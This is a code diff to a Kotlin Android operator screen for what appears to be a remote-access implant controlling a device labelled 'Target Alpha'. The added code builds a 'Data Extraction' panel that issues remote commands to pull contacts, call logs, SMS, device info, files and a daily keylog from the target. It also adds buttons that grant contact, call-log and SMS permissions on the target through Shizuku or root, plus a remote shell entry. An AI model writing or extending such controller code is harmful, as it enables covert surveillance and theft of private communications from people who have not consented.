@@ -3,6 +3,9 @@ package com.shadow.operator.ui.fleet
 import androidx.compose.foundation.background
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.lazy.grid.GridCells
+import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
+import androidx.compose.foundation.lazy.grid.items
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.verticalScroll
@@ -13,6 +16,7 @@ import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
@@ -33,6 +37,8 @@ fun FleetScreen(
     var status by remember { mutableStateOf<Map<String, Any>?>(null) }
     var connected by remember { mutableStateOf(false) }
     var lastHeartbeat by remember { mutableStateOf(0L) }
+    var resultText by remember { mutableStateOf<String?>(null) }
+    var busyAction by remember { mutableStateOf<String?>(null) }
     val scope = rememberCoroutineScope()
 
     // Poll status every 5 seconds
@@ -42,6 +48,17 @@ fun FleetScreen(
             connected = (status?.get("connected") as? Boolean) ?: false
             lastHeartbeat = (status?.get("lastHeartbeat") as? Long) ?: (status?.get("lastHeartbeat") as? Int)?.toLong() ?: 0L
             delay(5000)
+        }
+    }
+
+    fun runAction(label: String, command: String, payload: String = "{}") {
+        if (busyAction != null) return
+        busyAction = label
+        resultText = "Executing $label..."
+        scope.launch {
+            val result = rpc.execute(command, payload)
+            resultText = result
+            busyAction = null
         }
     }
 
@@ -67,7 +84,6 @@ fun FleetScreen(
                     }
                 },
                 actions = {
-                    // Connection indicator
                     Row(
                         verticalAlignment = Alignment.CenterVertically,
                         modifier = Modifier.padding(horizontal = 12.dp)
@@ -105,123 +121,212 @@ fun FleetScreen(
                 .padding(16.dp),
             verticalArrangement = Arrangement.spacedBy(12.dp)
         ) {
-            // Implant card
+            // Connection status card
             Card(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .clickable { onImplantSelect() },
                 colors = CardDefaults.cardColors(containerColor = SurfaceElevated),
                 shape = RoundedCornerShape(12.dp)
             ) {
-                Column(modifier = Modifier.padding(16.dp)) {
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.SpaceBetween,
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        Row(verticalAlignment = Alignment.CenterVertically) {
-                            Icon(
-                                Icons.Default.Terminal,
-                                contentDescription = null,
-                                tint = if (connected) AccentGreen else TextSecondary,
-                                modifier = Modifier.size(28.dp)
-                            )
-                            Spacer(Modifier.width(12.dp))
-                            Column {
-                                Text(
-                                    "Target Alpha",
-                                    color = TextPrimary,
-                                    fontFamily = FontFamily.Monospace,
-                                    fontWeight = FontWeight.Bold,
-                                    fontSize = 18.sp
-                                )
-                                Text(
-                                    "f673be59...",
-                                    color = TextSecondary,
-                                    fontFamily = FontFamily.Monospace,
-                                    fontSize = 11.sp
-                                )
-                            }
-                        }
-                        Column(horizontalAlignment = Alignment.End) {
-                            Text(
-                                if (connected) "LIVE" else "DEAD",
-                                color = if (connected) OnlineGreen else OfflineRed,
-                                fontFamily = FontFamily.Monospace,
-                                fontWeight = FontWeight.Bold,
-                                fontSize = 14.sp
-                            )
-                            if (lastHeartbeat > 0) {
-                                val secs = (System.currentTimeMillis() - lastHeartbeat) / 1000
-                                Text(
-                                    "${secs}s ago",
-                                    color = TextSecondary,
-                                    fontFamily = FontFamily.Monospace,
-                                    fontSize = 10.sp
-                                )
-                            }
-                        }
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .padding(16.dp),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Column {
+                        Text(
+                            "Target Alpha",
+                            color = TextPrimary,
+                            fontFamily = FontFamily.Monospace,
+                            fontWeight = FontWeight.Bold,
+                            fontSize = 18.sp
+                        )
+                        Text(
+                            if (connected) "LIVE" else "DEAD",
+                            color = if (connected) OnlineGreen else OfflineRed,
+                            fontFamily = FontFamily.Monospace,
+                            fontWeight = FontWeight.Bold,
+                            fontSize = 14.sp
+                        )
                     }
-
-                    Spacer(Modifier.height(16.dp))
-
-                    // Quick action buttons
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.spacedBy(8.dp)
-                    ) {
-                        QuickAction(Icons.Default.Terminal, "Shell", AccentGreen) { onImplantSelect() }
-                        QuickAction(Icons.Default.Folder, "Files", AccentAmber) { onFileManager() }
-                        QuickAction(Icons.Default.Extension, "Modules", AccentPurple) { onModules() }
+                    Column(horizontalAlignment = Alignment.End) {
+                        if (lastHeartbeat > 0) {
+                            val secs = (System.currentTimeMillis() - lastHeartbeat) / 1000
+                            Text(
+                                "${secs}s ago",
+                                color = TextSecondary,
+                                fontFamily = FontFamily.Monospace,
+                                fontSize = 11.sp
+                            )
+                        }
+                        Text(
+                            "Pending: ${status?.get("pendingCommands") ?: "--"}",
+                            color = TextSecondary,
+                            fontFamily = FontFamily.Monospace,
+                            fontSize = 11.sp
+                        )
                     }
                 }
             }
 
-            // Stats card
+            // Terminal (full width)
             Card(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .clickable { onImplantSelect() },
                 colors = CardDefaults.cardColors(containerColor = SurfaceDark),
                 shape = RoundedCornerShape(12.dp)
             ) {
-                Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .padding(16.dp),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Icon(Icons.Default.Terminal, contentDescription = null, tint = AccentGreen, modifier = Modifier.size(24.dp))
+                    Spacer(Modifier.width(12.dp))
                     Text(
-                        "STATS",
-                        color = TextSecondary,
+                        "Shell Terminal",
+                        color = TextPrimary,
                         fontFamily = FontFamily.Monospace,
-                        fontSize = 10.sp,
-                        fontWeight = FontWeight.Bold
+                        fontSize = 16.sp,
+                        modifier = Modifier.weight(1f)
                     )
-                    Spacer(Modifier.height(8.dp))
-                    StatRow("Pending Commands", (status?.get("pendingCommands") as? Int)?.toString() ?: "--")
-                    StatRow("Last Heartbeat", if (lastHeartbeat > 0) "${(System.currentTimeMillis() - lastHeartbeat) / 1000}s ago" else "never")
-                    StatRow("WebSocket", if (connected) "connected" else "disconnected")
+                    Icon(Icons.Default.ChevronRight, contentDescription = null, tint = TextSecondary)
+                }
+            }
+
+            // DATA EXTRACTION grid
+            Text(
+                "DATA EXTRACTION",
+                color = TextSecondary,
+                fontFamily = FontFamily.Monospace,
+                fontSize = 11.sp,
+                fontWeight = FontWeight.Bold
+            )
+            LazyVerticalGrid(
+                columns = GridCells.Fixed(3),
+                horizontalArrangement = Arrangement.spacedBy(8.dp),
+                verticalArrangement = Arrangement.spacedBy(8.dp),
+                modifier = Modifier.height(180.dp)
+            ) {
+                items(listOf(
+                    ActionData("Contacts", Icons.Default.Contacts, Color.White, "contacts"),
+                    ActionData("Call Log", Icons.Default.Call, Color.White, "calllog"),
+                    ActionData("SMS", Icons.Default.Message, Color.White, "sms"),
+                    ActionData("Device Info", Icons.Default.Info, AccentBlue, "device_info"),
+                    ActionData("Files", Icons.Default.Folder, AccentAmber, "__files__"),
+                    ActionData("Keylog Today", Icons.Default.Keyboard, AccentRed, "keylog_file"),
+                )) { action ->
+                    ActionButton(
+                        label = action.label,
+                        icon = action.icon,
+                        color = action.color,
+                        busy = busyAction == action.label,
+                        onClick = {
+                            if (action.command == "__files__") onFileManager()
+                            else runAction(action.label, action.command)
+                        }
+                    )
+                }
+            }
+
+            // PERMISSIONS grid
+            Text(
+                "GRANT PERMISSIONS (requires Shizuku/root on target)",
+                color = TextSecondary,
+                fontFamily = FontFamily.Monospace,
+                fontSize = 11.sp,
+                fontWeight = FontWeight.Bold
+            )
+            LazyVerticalGrid(
+                columns = GridCells.Fixed(3),
+                horizontalArrangement = Arrangement.spacedBy(8.dp),
+                verticalArrangement = Arrangement.spacedBy(8.dp),
+                modifier = Modifier.height(120.dp)
+            ) {
+                items(listOf(
+                    ActionData("Read Contacts", Icons.Default.Contacts, AccentGreen, "grant:READ_CONTACTS"),
+                    ActionData("Read CallLog", Icons.Default.Call, AccentGreen, "grant:READ_CALL_LOG"),
+                    ActionData("Read SMS", Icons.Default.Message, AccentGreen, "grant:READ_SMS"),
+                )) { action ->
+                    ActionButton(
+                        label = action.label,
+                        icon = action.icon,
+                        color = action.color,
+                        busy = busyAction == action.label,
+                        onClick = {
+                            val perm = action.command.substringAfter("grant:")
+                            runAction(action.label, "grant", """{"permission":"$perm"}""")
+                        }
+                    )
+                }
+            }
+
+            // Result display
+            if (resultText != null) {
+                Card(
+                    colors = CardDefaults.cardColors(containerColor = SurfaceDark),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    Column(modifier = Modifier.padding(16.dp)) {
+                        Text(
+                            "OUTPUT",
+                            color = AccentGreen,
+                            fontFamily = FontFamily.Monospace,
+                            fontSize = 11.sp,
+                            fontWeight = FontWeight.Bold
+                        )
+                        Spacer(Modifier.height(8.dp))
+                        Text(
+                            resultText ?: "",
+                            color = TextPrimary,
+                            fontFamily = FontFamily.Monospace,
+                            fontSize = 12.sp,
+                            lineHeight = 18.sp,
+                            maxLines = 30,
+                            overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis
+                        )
+                    }
                 }
             }
         }
     }
 }
 
+data class ActionData(val label: String, val icon: ImageVector, val color: Color, val command: String)
+
 @Composable
-fun QuickAction(icon: androidx.compose.ui.graphics.vector.ImageVector, label: String, color: Color, onClick: () -> Unit) {
+fun ActionButton(label: String, icon: ImageVector, color: Color, busy: Boolean, onClick: () -> Unit) {
     Card(
         modifier = Modifier
-            .weight(1f)
+            .fillMaxWidth()
+            .aspectRatio(1f)
             .clickable(onClick = onClick),
-        colors = CardDefaults.cardColors(containerColor = SurfaceDark),
-        shape = RoundedCornerShape(8.dp)
+        colors = CardDefaults.cardColors(containerColor = if (busy) AccentGreen.copy(alpha = 0.1f) else SurfaceElevated),
+        shape = RoundedCornerShape(12.dp)
     ) {
         Column(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(vertical = 12.dp),
-            horizontalAlignment = Alignment.CenterHorizontally
+            modifier = Modifier.fillMaxSize(),
+            horizontalAlignment = Alignment.CenterHorizontally,
+            verticalArrangement = Arrangement.Center
         ) {
-            Icon(icon, contentDescription = label, tint = color, modifier = Modifier.size(20.dp))
-            Spacer(Modifier.height(4.dp))
+            if (busy) {
+                CircularProgressIndicator(
+                    color = color,
+                    modifier = Modifier.size(20.dp),
+                    strokeWidth = 2.dp
+                )
+            } else {
+                Icon(icon, contentDescription = label, tint = color, modifier = Modifier.size(22.dp))
+            }
+            Spacer(Modifier.height(6.dp))
             Text(
                 label,
-                color = TextSecondary,
+                color = if (busy) AccentGreen else TextSecondary,
                 fontFamily = FontFamily.Monospace,
-                fontSize = 10.sp
+                fontSize = 10.sp,
+                maxLines = 1
             )
         }
     }
